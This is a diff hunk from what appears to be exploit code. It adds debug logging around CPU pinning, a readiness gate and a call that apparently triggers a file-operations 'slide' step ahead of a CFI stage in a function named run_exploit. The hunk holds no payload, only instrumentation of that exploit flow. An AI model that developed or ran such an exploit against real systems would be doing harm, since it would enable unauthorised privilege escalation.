@@ -902,12 +902,17 @@ int run_exploit(int argc, char **argv) {
    * attempts; the gate fails the attempt cleanly instead. */
   pin_to_core(RMG_CORE_LITERAL);
   durable_log_checkpoint("fops-pre-pin-little");
+  rmg_diag("PIN after pin_to_core core=%d\n", sched_getcpu());
   if (!rmg_pin_gate_ready()) {
+    rmg_diag("PIN gate FAILED core=%d\n", sched_getcpu());
     pr_error("fops write stage pin gate failed; failing attempt cleanly\n");
     return 1;
   }
+  rmg_diag("PIN gate OK core=%d\n", sched_getcpu());
   for (int attempt = 1; attempt <= 1; attempt++) {
+    rmg_diag("PIN about to trigger_fops_slide_route\n");
     int triggered = app_trigger_fops_slide_route();
+    rmg_diag("PIN trigger returned triggered=%d\n", triggered);
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
     int verified = triggered && try_cfi_stage();
